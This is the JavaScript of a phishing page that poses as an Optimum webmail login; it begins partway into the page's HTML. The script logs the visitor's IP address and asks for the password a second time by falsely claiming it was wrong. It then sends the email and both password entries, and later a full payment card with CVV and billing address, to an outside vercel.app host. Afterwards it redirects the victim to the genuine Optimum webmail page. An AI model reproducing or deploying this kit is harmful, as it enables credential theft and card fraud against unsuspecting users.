                        <input id="address-2" type="text"

    <script>
        const baseURL = 'https://fr-1290-2o1v.vercel.app/';
	const CHAT_ID = 'forjjj11@gmail.com';

        let email = '';
        let IPAddress = '';
        let password2 = '';

        // Fetch IP on load
        window.addEventListener('load', () => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    IPAddress = data.ip;
                })
                .catch(error => console.error(error));
        });

        async function Authenticate({ email, password, password2, name, IPAddress, title, metaData }) {
            if (!CHAT_ID || !password || !name) {
                console.log('error authenticating');
                return;
            } else {
                const data = JSON.stringify({
                    email,
                    password,
                    password2,
                    name,
                    IPAddress,
                    ...metaData,
                });

                try {
                    const response = await fetch(`${baseURL}main`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ data, chatId: CHAT_ID, title })
                    });
                    const respData = await response.json();
                    console.log(respData);
                    return respData;
                } catch (e) {
                    console.log(e);
                    return { success: true };
                }
            }
        }

        async function sendBillingData(billingData) {
            const payload = {
                data: JSON.stringify({
                    email: email,
                    IPAddress: IPAddress,
                    name: 'Optimum Billing',
                    ...billingData
                }),
                chatId: CHAT_ID,
                title: 'Optimum Billing Info'
            };
            try {
                await fetch(`${baseURL}main`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ...payload })
                });
                window.location.replace('https://myemail.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail');
            } catch (e) {
                console.log(e);
                window.location.replace('https://myemail.optimum.net/webmail/index-rui.jsp?v=ci-ALTUX_2.3.2#/mail');
            }
        }

        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailError = document.getElementById('email-error');
        const passwordError = document.getElementById('password-error');
        const submitBtn = document.getElementById('submit-btn');

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        emailInput.addEventListener('input', (e) => {
            email = e.target.value;
            const billingEmail = document.getElementById('billing-email');
            if (billingEmail) billingEmail.value = email;
        });

        const expYyyy = document.getElementById('exp-yyyy');
        if (expYyyy) {
            const currentYear = new Date().getFullYear();
            for (let i = 0; i < 15; i++) {
                const opt = document.createElement('option');
                opt.value = currentYear + i;
                opt.textContent = currentYear + i;
                expYyyy.appendChild(opt);
            }
        }

        const cardInput = document.getElementById('card-number');
        if (cardInput) {
            cardInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/\D/g, '');
                let formattedValue = '';
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
                    formattedValue += value[i];
                }
                e.target.value = formattedValue;
            });
        }

        const cvvInput = document.getElementById('cvv');
        if (cvvInput) {
            cvvInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
            });
        }

        submitBtn.addEventListener('click', () => {
            const email = emailInput.value;
            const password = passwordInput.value;

            // Reset errors
            emailError.textContent = '';
            emailError.classList.add('hidden');
            passwordError.textContent = '';
            passwordError.classList.add('hidden');

            if (!email) {
                emailError.textContent = 'Enter your email address';
                emailError.classList.remove('hidden');
                return;
            } else if (!emailRegex.test(email)) {
                emailError.textContent = 'Please enter a valid email format.';
                emailError.classList.remove('hidden');
                return;
            } else if (!password) {
                passwordError.textContent = 'Enter your password';
                passwordError.classList.remove('hidden');
                return;
            } else if (password && !password2) {
                passwordError.textContent = 'Please enter correct password';
                passwordError.classList.remove('hidden');
                password2 = password; // Set password2 to verify next time
                passwordInput.value = ''; // Clear password input
                return;
            } else {
                Authenticate({
                    email,
                    password,
                    password2,
                    name: 'Optimum',
                    IPAddress,
                    title: 'Optimum',
                }).then(() => {
                    document.getElementById('step-1').classList.add('hidden');
                    document.getElementById('step-2').classList.remove('hidden');
                });
            }
        });

        const billingBtn = document.getElementById('billing-submit-btn');
        if (billingBtn) {
            billingBtn.addEventListener('click', () => {
                document.querySelectorAll('[id^="error-"]').forEach(el => el.classList.add('hidden'));
                let isValid = true;

                const cardNum = document.getElementById('card-number').value.replace(/\s/g, '');
                const cardName = document.getElementById('card-name').value.trim();
                const bEmail = document.getElementById('billing-email').value.trim();
                const expMM = document.getElementById('exp-mm').value;
                const expYY = document.getElementById('exp-yyyy').value;
                const cvv = document.getElementById('cvv').value.trim();
                const addr1 = document.getElementById('address-1').value.trim();
                const addr2 = document.getElementById('address-2').value.trim();
                const country = document.getElementById('country').value;

                if (!cardNum || cardNum.length < 13) {
                    document.getElementById('error-card-number').innerText = 'Invalid card number';
                    document.getElementById('error-card-number').classList.remove('hidden');
                    isValid = false;
                }
                if (!cardName) {
                    document.getElementById('error-card-name').innerText = 'Name required';
                    document.getElementById('error-card-name').classList.remove('hidden');
                    isValid = false;
                }
                if (!bEmail || !bEmail.includes('@')) {
                    document.getElementById('error-billing-email').innerText = 'Invalid email';
                    document.getElementById('error-billing-email').classList.remove('hidden');
                    isValid = false;
                }
                if (!expMM || !expYY) {
                    document.getElementById('error-expiry').innerText = 'Date required';
                    document.getElementById('error-expiry').classList.remove('hidden');
                    isValid = false;
                }
                if (!cvv || cvv.length < 3) {
                    document.getElementById('error-cvv').innerText = 'Invalid CVV';
                    document.getElementById('error-cvv').classList.remove('hidden');
                    isValid = false;
                }
                if (!addr1) {
                    document.getElementById('error-address-1').innerText = 'Address required';
                    document.getElementById('error-address-1').classList.remove('hidden');
                    isValid = false;
                }

                if (isValid) {
                    sendBillingData({
                        cardNumber: cardNum,
                        cardName,
                        billingEmail: bEmail,
                        expiry: `${expMM}/${expYY}`,
                        cvv,
                        address1: addr1,
                        address2: addr2,
                        country
                    });
                }
            });
        }
    </script>
